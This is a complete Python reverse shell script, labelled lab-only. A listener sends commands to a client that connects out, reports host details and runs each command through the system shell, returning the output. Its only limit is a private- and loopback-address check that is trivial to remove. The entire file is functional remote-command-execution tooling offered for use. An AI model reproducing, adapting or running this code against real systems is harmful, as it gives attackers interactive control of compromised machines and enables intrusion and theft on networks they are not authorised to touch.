#!/usr/bin/env python3
"""
Lab-only reverse shell helper for private/loopback networks.

Listener:
  python3 lab_reverse_shell.py listen --host 0.0.0.0 --port 4444

Client, from a machine you are authorized to test:
  python3 lab_reverse_shell.py connect --host 192.168.45.10 --port 4444

The connect target must be a private or loopback IP.
"""

import argparse
import ipaddress
import json
import os
import socket
import struct
import subprocess
from typing import Any


MAX_MESSAGE = 4 * 1024 * 1024


def send_msg(sock: socket.socket, obj: Any) -> None:
    data = json.dumps(obj).encode("utf-8", errors="replace")
    if len(data) > MAX_MESSAGE:
        raise ValueError("Message too large")
    sock.sendall(struct.pack("!I", len(data)) + data)


def recv_exact(sock: socket.socket, size: int) -> bytes:
    chunks = []
    remaining = size
    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionError("Connection closed")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_msg(sock: socket.socket) -> Any:
    header = recv_exact(sock, 4)
    (size,) = struct.unpack("!I", header)
    if size > MAX_MESSAGE:
        raise ValueError("Incoming message too large")
    return json.loads(recv_exact(sock, size).decode("utf-8", errors="replace"))


def validate_private_target(host: str) -> str:
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror as exc:
        raise SystemExit(f"[!] Could not resolve {host}: {exc}") from exc

    addr = ipaddress.ip_address(ip)
    if not (addr.is_private or addr.is_loopback):
        raise SystemExit("[!] Connect target must be a private or loopback IP.")
    return ip


def validate_bind_host(host: str) -> None:
    addr = ipaddress.ip_address(host)
    if not (addr.is_private or addr.is_loopback or addr.is_unspecified):
        raise SystemExit("[!] Listener must bind to private/loopback/0.0.0.0 only.")


def run_command(command: str) -> dict:
    command = command.strip()

    if command.startswith("cd "):
        path = command[3:].strip()
        try:
            os.chdir(os.path.expanduser(path))
            return {"output": f"cwd: {os.getcwd()}", "cwd": os.getcwd()}
        except Exception as exc:
            return {"output": f"cd: {exc}", "cwd": os.getcwd()}

    try:
        completed = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=60,
        )
        return {
            "output": completed.stdout,
            "returncode": completed.returncode,
            "cwd": os.getcwd(),
        }
    except subprocess.TimeoutExpired:
        return {"output": "[command timed out after 60s]", "cwd": os.getcwd()}
    except Exception as exc:
        return {"output": f"[error] {exc}", "cwd": os.getcwd()}


def connect_mode(host: str, port: int) -> None:
    target_ip = validate_private_target(host)

    with socket.create_connection((target_ip, port), timeout=10) as sock:
        send_msg(
            sock,
            {
                "type": "hello",
                "hostname": socket.gethostname(),
                "cwd": os.getcwd(),
                "platform": os.name,
            },
        )

        while True:
            request = recv_msg(sock)
            if request.get("type") != "command":
                continue

            command = request.get("command", "")
            if command.strip().lower() in {"exit", "quit"}:
                send_msg(sock, {"type": "result", "output": "closing"})
                break

            send_msg(sock, {"type": "result", **run_command(command)})


def listen_mode(host: str, port: int) -> None:
    validate_bind_host(host)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(1)

        print(f"[+] Listening on {host}:{port}")
        client, addr = server.accept()

        with client:
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            hello = recv_msg(client)
            print(
                f"[+] Host={hello.get('hostname')} "
                f"cwd={hello.get('cwd')} platform={hello.get('platform')}"
            )

            while True:
                try:
                    command = input("lab-shell> ")
                except (EOFError, KeyboardInterrupt):
                    command = "exit"
                    print()

                send_msg(client, {"type": "command", "command": command})
                result = recv_msg(client)
                print(result.get("output", ""), end="")
                if result.get("output") and not result.get("output", "").endswith("\n"):
                    print()

                if command.strip().lower() in {"exit", "quit"}:
                    break


def parse_args():
    parser = argparse.ArgumentParser(description="Lab-only private-network reverse shell helper")
    sub = parser.add_subparsers(dest="mode", required=True)

    p_listen = sub.add_parser("listen")
    p_listen.add_argument("--host", default="0.0.0.0")
    p_listen.add_argument("--port", type=int, required=True)

    p_connect = sub.add_parser("connect")
    p_connect.add_argument("--host", required=True)
    p_connect.add_argument("--port", type=int, required=True)

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    if args.mode == "listen":
        listen_mode(args.host, args.port)
    else:
        connect_mode(args.host, args.port)
